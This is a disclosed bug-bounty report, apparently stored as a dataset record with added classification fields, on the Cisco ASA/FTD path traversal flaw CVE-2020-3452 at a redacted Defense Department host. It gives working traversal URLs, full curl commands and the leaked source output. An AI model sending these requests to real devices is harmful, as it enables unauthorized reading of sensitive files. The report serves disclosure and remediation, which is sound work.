{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "they ",
  "title": "https://\u2588\u2588\u2588\u2588\u2588 is vulnerable to CVE-2020-3452 Read-Only Path Traversal Vulnerability",
  "content": "\nSummary:\nhttps://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 is vulnerable to a Read-Only Path Traversal Vulnerability\nDescription:\nGet request parameters at the /+CSCOT+/translation-table and the /+CSCOT+/oem-customization are not properly sanitized which allows for reading files within the webroot directory that are not intended to be readable.\nImpact\nAn unauthenticated, remote attacker can read sensitive files located inside the webroot directory.\nStep-by-step Reproduction Instructions\nUsing Browser\nVisit https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../ in browser and note that you are prompted for a file download. This will be the source code for portal_inc.lua which is not normally accessible.\nTo verify you cannot access this file normally, visit https://\u2588\u2588\u2588\u2588\u2588\u2588/+CSCOE+/portal_inc.lua and verify that you receive a page that says \"Wrong URL\".\nUsing Curl\nIn a linux terminal, send the following curl command:\nCode 488 Bytes\n1curl -i -s -k -X $'GET' \\\n2    -H $'Host: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'DNT: 1' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \\\n3    $'https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../'\nand\nCode 497 Bytes\n1curl -i -s -k -X $'GET' \\\n2    -H $'Host: \u2588\u2588\u2588\u2588' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'DNT: 1' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' \\\n3    $'https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua'\nYou should receive the following output:\nCode 564 Bytes\n1HTTP/1.1 200 OK\n2Content-Type: application/octet-stream\n3Transfer-Encoding: chunked\n4Cache-Control: no-cache\n5Pragma: no-cache\n6Connection: Keep-Alive\n7Date: Fri, 24 Jul 2020 04:27:46 GMT\n8X-Frame-Options: SAMEORIGIN\n9Strict-Transport-Security: max-age=31536000; includeSubDomains\n10\n11-- Copyright (C) 2006-2018 by Cisco Systems, Inc.\n12-- Created by otrizna@cisco.com\n13\n14dofile(\"/+CSCOE+/include/common.lua\")\n15dofile(\"/+CSCOE+/include/browser_inc.lua\")\n16\n17local function compare(a,b) return a[\"order\"]<b[\"order\"] end;\n18\n19function INTERNAL_PASSWORD_ENABLED(name)\n20        return false;\nTo verify you should not be able to access this info, run the following curl command:\nCode 407 Bytes\n1curl -i -s -k -X $'GET'  \\\n2   -H $'Host: \u2588\u2588\u2588\u2588\u2588' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'DNT: 1' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1'   \\\n3  $'https://\u2588\u2588\u2588/%2bCSCOE%2b/portal_inc.lua'\nYou should receive the following output:\nCode 213 Bytes\n1HTTP/1.1 500 Internal Error\n2Cache-Control: no-cache\n3Pragma: no-cache\n4Connection: Close\n5Date: Fri, 24 Jul 2020 04:28:13 GMT\n6X-Frame-Options: SAMEORIGIN\n7Strict-Transport-Security: max-age=31536000; includeSubDomains\nScreenshots in Burpsuite showing the requests succeeding and failing\nSuccess at https://\u2588\u2588\u2588/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../ which results in disclosure of the source code in portal_inc.lua\n\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nFailure trying to access https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588/+CSCOE+/portal_inc.lua\n\u2588\u2588\u2588\nSuggested Mitigation/Remediation Actions\nUpgrade to the latest version of Cisco ASA or Cisco FTD.\nReferences\nhttps://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-ro-path-KJuQhB86\nhttps://twitter.com/aboul3la/status/1286012324722155525\nImpact\nCVSS Score: Base 7.5\nVector: CVSS:3.1/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N/E:X/RL:X/RC:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MPR:X/MUI:X/MS:X/MC:X/MI:X/MA:X\nAn unauthenticated, remote attacker can read sensitive files located inside the webroot directory.\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "Path Traversal"
  ],
  "screenshots": {},
  "disclosed_date": 1597356480,
  "report_url": "https://hackerone.com/reports/940384",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Visit https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../ in browser and note the file download prompt for portal_inc.lua"
    ],
    [
      2,
      "Verify normal access is blocked by visiting https://\u2588\u2588\u2588\u2588\u2588\u2588/+CSCOE+/portal_inc.lua and receiving a 'Wrong URL' error"
    ]
  ],
  "vuln_description": "A path traversal vulnerability in Cisco ASA/FTD devices allows unauthenticated attackers to read sensitive files within the webroot directory via specially crafted requests to /+CSCOT+/ endpoints.",
  "reason": "The vulnerability involves a straightforward path traversal technique with no complex application state manipulation or novel logic required. The attack pattern follows common path traversal methodologies and the vulnerable endpoints are clearly identifiable.",
  "new_complexity": "LOW",
  "requires_code": false,
  "requires_CVE": true,
  "is_ctf": false,
  "other_report": null
}